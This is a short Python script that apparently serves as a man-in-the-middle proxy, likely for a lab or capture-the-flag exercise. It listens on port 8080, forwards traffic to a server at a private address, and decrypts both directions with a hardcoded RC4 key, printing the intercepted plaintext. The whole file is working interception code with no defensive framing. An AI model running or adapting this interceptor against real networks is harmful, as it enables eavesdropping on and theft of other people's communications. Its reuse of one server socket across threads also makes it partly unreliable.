import socket
import threading

key = "key"

def rc4(key, message):
    S = list(range(256))
    j = 0
    out = []

    # Key Scheduling Algorithm (KSA)
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    # Pseudorandom Generation Algorithm (PRGA)
    i = j = 0
    for char in message:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        out.append(chr(ord(char) ^ K))
    return ''.join(out)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

mitm_ip = '0.0.0.0'
client_port = 8080
server_ip = '192.168.2.2'  # Replace with the actual server IP address
server_port = 80

client_socket.bind((mitm_ip, client_port))
client_socket.listen(1)
print(f"MitM listening on port {client_port}...")

def handle_client(client_conn):
    try:
        server_socket.connect((server_ip, server_port))
        while True:
            client_message = client_conn.recv(1024)
            if not client_message:
                break
            decrypted_client_message = rc4(key, client_message.decode('utf-8'))
            print(f"Intercepted from client: {decrypted_client_message}")
            server_socket.send(client_message)

            server_message = server_socket.recv(1024)
            decrypted_server_message = rc4(key, server_message.decode('utf-8'))
            print(f"Intercepted from server: {decrypted_server_message}")
            client_conn.send(server_message)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_conn.close()
        server_socket.close()

while True:
    client_conn, client_address = client_socket.accept()
    print(f"Connection from {client_address} intercepted")
    client_thread = threading.Thread(target=handle_client, args=(client_conn,))
    client_thread.start()
